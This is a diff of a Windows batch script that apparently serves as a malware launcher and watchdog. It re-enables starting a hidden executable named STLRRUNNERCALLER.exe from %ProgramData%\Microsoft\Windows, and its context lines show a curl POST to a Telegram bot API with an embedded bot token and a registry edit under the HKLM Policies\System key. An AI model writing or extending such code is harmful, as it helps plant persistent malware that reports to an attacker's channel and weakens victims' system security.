@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=8.1"
+set "BATCHVERSION=8.3"
 
 
 
@@ -90,6 +90,9 @@ echo RUNEVERYCALLER.exe is not running. Continue.....
 
 
 
+set "CheckSend=0"
+set "lastMinute=none"
+
 
 
 goto NEXT9
@@ -113,11 +116,6 @@ curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBu
 
 
 
-
-
-
-set "CheckSend=0"
-set "lastMinute=none"
 
 
 
@@ -201,7 +199,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-taskkill /F /IM STLRRUNNERCALLER.exe
 
 
 
@@ -215,8 +212,9 @@ goto :NEXT3
 tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
 if %errorlevel% neq 0 (
     echo STLRRUNNERCALLER.exe is not running.
+    set "CheckSend=1"
     echo Starting STLRRUNNERCALLER...
-    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
     echo Started.
 ) else (
     echo STLRRUNNERCALLER.exe is already running.
